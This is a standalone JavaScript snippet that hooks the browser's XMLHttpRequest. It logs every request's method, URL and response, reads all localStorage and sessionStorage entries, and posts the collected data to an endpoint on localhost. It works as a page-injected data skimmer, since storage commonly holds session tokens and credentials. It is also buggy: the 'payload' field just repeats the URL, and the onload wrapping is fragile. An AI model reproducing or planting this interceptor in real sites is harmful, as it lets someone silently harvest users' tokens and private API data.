
// Create a list to store XMLHttpRequest data
const requests = [];
function getAllSessionStorageData() {
  const sessionStorageData = {};

  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    sessionStorageData[key] = value;
  }

  return sessionStorageData;
}
function getAlllocalStorageData() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }

  return localStorageData;
}

// Define the API endpoint to exclude
const excludedEndpoint = 'http://localhost:8080/api/client/sessionstoragedata';

// Override the XMLHttpRequest object
(function() {
  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
  const sessionStorageData = {};

  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    sessionStorageData[key] = value;
  }
 
  const originalXHR = window.XMLHttpRequest;

  function newXHR() {
    const xhr = new originalXHR();
    // Intercept the open() method to capture request details
    const originalOpen = xhr.open;
    xhr.open = function() {
      const url = arguments[1];

      // Check if the request URL matches the excluded endpoint
      if (url !== excludedEndpoint) {
        const requestDetails = {
          method: arguments[0],
          url: url,
          payload: arguments[1], // Include the request payload
          response: null // Initialize response as null
        };

        // Store the request details
        requests.push(requestDetails);
      }
      // Call the original open() method
      originalOpen.apply(this, arguments);
    };
    // Intercept the onload() method to capture response details
    const originalOnload = xhr.onload;
    xhr.onload = function() {
      const request = requests.find((r) => r.url === xhr.responseURL);
      if (request) {
        request.response = xhr.responseText; // Store the response
    
        // Send the captured requests to the server (excluding the excluded endpoint)
        const filteredRequests = requests.filter(
          (r) => r.response !== null && r.response !== undefined && r.url !== excludedEndpoint
        );
      
        fetch(excludedEndpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({filteredRequests,localStorageData,sessionStorageData}) // Send filtered requests as JSON
        })
          .then((response) => {
            // console.log(response);
            // Handle the response from the sensitive key URL if needed
          })
          .catch((error) => {
            // console.error(error);
            // Handle any errors that occurred during the request
          });
      }
      // Call the original onload() method
      originalOnload.apply(this, arguments);
    };
    return xhr;
  }
  window.XMLHttpRequest = newXHR;
})();




